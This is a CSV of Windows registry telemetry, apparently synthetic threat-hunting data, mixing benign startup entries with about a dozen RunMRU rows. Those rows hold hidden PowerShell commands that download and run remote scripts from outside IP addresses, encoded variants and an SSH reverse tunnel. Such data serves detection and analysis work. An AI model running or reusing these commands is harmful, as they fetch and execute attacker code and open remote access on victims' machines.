Timestamp,DeviceId,DeviceName,ActionType,RegistryKey,RegistryValueName,RegistryValueData,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-02-23T17:59:11.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2008\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,c,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://77.91.68.20/kimsuky2.ps1)""",explorer.exe,11814,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,9de4b6162f1d8fefef0c61aec3204f22
2026-02-24T19:50:16.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2009\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,c,powershell.exe -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwA0ADUALgAxADQAMQAuADgANwAuA,explorer.exe,12309,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,7dbd15687589609cc404f5887cf9b8d0
2026-02-25T19:45:42.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2010\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,c,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://179.43.167.55/kim",explorer.exe,12916,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,716a249cc03453f698714d824d2ce59c
2026-02-26T18:44:35.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2005\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,d,"powershell.exe -W Hidden -NoP -Ep Bypass -c ""iex(iwr https://77.91.68.20/mw2)""",explorer.exe,13208,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,1544facbe21a87200e3194e069e85b8c
2026-02-27T19:10:32.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2006\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,d,"powershell.exe -WindowStyle Hidden -c ""IEX(irm 'https://45.141.87.30/mw/run')""",explorer.exe,13482,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,36190a9c8e6da7e23438be4551bfefda
2026-02-28T19:45:16.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2007\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,d,powershell.exe -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwAxADcAOQAuADQAMwAuADEANgA3A,explorer.exe,13753,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,674aa6e4f1135109f84d1225420ebade
2026-02-28T22:12:40.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2009\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,e,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://77.91.68.20/filefix2.ps1)""",explorer.exe,14145,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,d83ab30084b29accbd4147d8a93a3e57
2026-02-27T20:16:09.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2010\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,e,"powershell.exe -ep bypass -w hidden -c ""irm https://45.141.87.30/ff2 | iex""",explorer.exe,14322,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,1295c19e41d58249523db26daf531012
2026-02-02T01:23:55.000Z,bbf1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0,PROD-WS-017,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2011\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,f,"powershell.exe -W Hidden -NoP -c ""ssh -o StrictHostKeyChecking=no -R 9090:localhost:80 tunnel@212.19",explorer.exe,14550,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,vklein,PROD,S-1-5-21-9876543210-0987654321-123456789-2011,e5c41edfce36fd1975d799cacb841b47
2026-02-03T00:42:13.000Z,ccf2e3d4c5b6a7f8e9d0c1b2a3f4e5d6c7b8a9f0e1,PROD-WS-018,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2012\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,f,"powershell.exe -WindowStyle Hidden -c ""iex(iwr 'https://77.91.68.20/apt28b/ldr')""",explorer.exe,14758,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,rbraun,PROD,S-1-5-21-9876543210-0987654321-123456789-2012,402ede3671e1cd557103bcdd23600410
2026-02-04T01:33:55.000Z,ddf3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2,PROD-LT-015,RegistryValueSet,HKEY_USERS\S-1-5-21-9876543210-0987654321-123456789-2013\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,f,powershell.exe -EncodedCommand cwBzAGgAIAAtAG8AIABTAHQAcgBpAGMAdABIAG8AcwB0AEsAZQB5AEMAaABlAGMAawBpA,explorer.exe,15212,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,msteinke,PROD,S-1-5-21-9876543210-0987654321-123456789-2013,3beb995911a04751861e59877d0b9b0a
2026-02-07T09:23:07.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,RegistryValueSet,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,CrowdStrike,C:\Program Files\CrowdStrike\CSFalconService.exe,msiexec.exe,37738,f6a1b2c3e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,c09277a24fa3cfc412ae72f8bc0728e0
2026-02-08T09:33:25.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,RegistryValueSet,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,SentinelAgent,C:\Program Files\SentinelOne\Sentinel Agent\SentinelAgent.exe,msiexec.exe,37951,f6a1b2c3e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,5bae40000515235372ca348f51c06e99
2026-02-21T09:43:02.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,Webex,C:\Program Files\Cisco Webex\bin\WebexHost.exe --minimized,msiexec.exe,38220,f6a1b2c3e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,c3aec30a2afdb2b0653bd572cdd05a85
2026-02-08T11:11:36.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,Citrix,C:\Program Files (x86)\Citrix\ICA Client\redirector.exe,msiexec.exe,38321,f6a1b2c3e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,2942cb69cec5f800b4967cf92e4ea5dc
2026-02-15T12:21:22.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,taskmgr.exe,explorer.exe,38420,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,f5afb63aef5a72c37a275adda44c39b6
2026-02-23T12:56:04.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,b,resmon.exe,explorer.exe,38447,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,aa9aa5ec29b72259e6aade0543253799
2026-02-25T11:32:43.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,c,perfmon.exe,explorer.exe,38487,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,66c7869d648a0a26c9574f3a10b789cc
2026-02-24T09:01:56.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,d,eventvwr.exe,explorer.exe,38655,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,725c61989a346fb7409f3034f1c37822
2026-02-13T12:04:06.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,e,diskmgmt.msc,explorer.exe,38826,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,a3de07d86c848018e70cada83a74e1c8
2026-02-01T09:47:45.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,f,compmgmt.msc,explorer.exe,38856,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,17f3348e4547b15007c54f56b09d3e6b
2026-02-03T08:00:37.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,g,services.msc,explorer.exe,39060,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,13d28c88212d6ed48a41b519e5aa7846
2026-02-04T08:25:55.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,h,gpedit.msc,explorer.exe,39125,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,af7e2383dd536dbdda766573a9eced78
2026-02-14T11:31:38.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,i,secpol.msc,explorer.exe,39132,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,38c173b46a6354acffcdd2e20fb66690
2026-02-09T10:05:17.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,j,lusrmgr.msc,explorer.exe,39429,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,69c8441ec6d11e716552c7b95bb68434
2026-02-19T12:31:08.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,k,certmgr.msc,explorer.exe,39639,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,b7105ce2b153bdbd8990d0123eded2a4
2026-02-23T09:01:27.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,RegistryValueSet,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,ESET,C:\Program Files\ESET\ESET Security\egui.exe /hide /waitservice,msiexec.exe,39823,f6a1b2c3e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,cb80b49747b89d696db1bc98dd347d99
2026-02-10T09:51:20.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,RegistryValueSet,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,VMwareTools,C:\Program Files\VMware\VMware Tools\vmtoolsd.exe,msiexec.exe,39932,f6a1b2c3e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,35c1f4f35b2f5e1b1990aa5ff26ab09e
2026-02-13T08:53:02.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,Dropbox,C:\Users\fmuller\AppData\Roaming\Dropbox\bin\Dropbox.exe /systemstartup,Dropbox.exe,39980,21b9fd61df73aeef0664ff4c2502575cc6327fd2,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,e0d5e4b13300c5957595ddfa0d5c5ae5
2026-02-05T08:48:45.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,GoogleDrive,C:\Program Files\Google\Drive File Stream\GoogleDriveFS.exe,msiexec.exe,40092,f6a1b2c3e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,6a60547d6962b51fe2c42943537629d0
2026-02-19T11:05:38.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,RegistryValueSet,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Qualys,C:\Program Files\QualysAgent\QualysAgent.exe,msiexec.exe,40320,f6a1b2c3e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,f651096b403f9fb6e13f7cd197ff7df9
